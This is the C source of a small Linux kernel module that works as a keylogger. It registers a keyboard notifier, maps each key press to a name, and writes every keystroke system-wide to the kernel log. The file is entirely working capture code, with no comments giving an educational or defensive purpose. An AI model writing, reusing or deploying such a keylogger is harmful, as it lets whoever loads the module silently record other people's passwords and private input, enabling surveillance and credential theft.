#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/keyboard.h>

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", "."};
                        
const int keymapSize = 53;
                    
int notify_keypress(struct notifier_block *nb, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param;
	param = _param;
	if(code == KBD_KEYCODE)
	{
		if(param->down)
		{
			if(param->value>=keymapSize || param->value < 0)
			{
				printk(KERN_INFO "%d\n", param->value);
			}
			else
			{
	    			printk(KERN_INFO "%s\n", keymap[param->value]);
			}
		}
	}	
	return NOTIFY_OK;
}

static struct notifier_block nb = {
	.notifier_call = notify_keypress
};

static int __init start(void)
{
	register_keyboard_notifier(&nb);
	printk(KERN_INFO "Keyboard Module Loaded!\n");
	return 0;
}
static void __exit end(void)
{
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Module Unloaded!\n");
}

module_init(start);
module_exit(end);
MODULE_LICENSE("GPL");
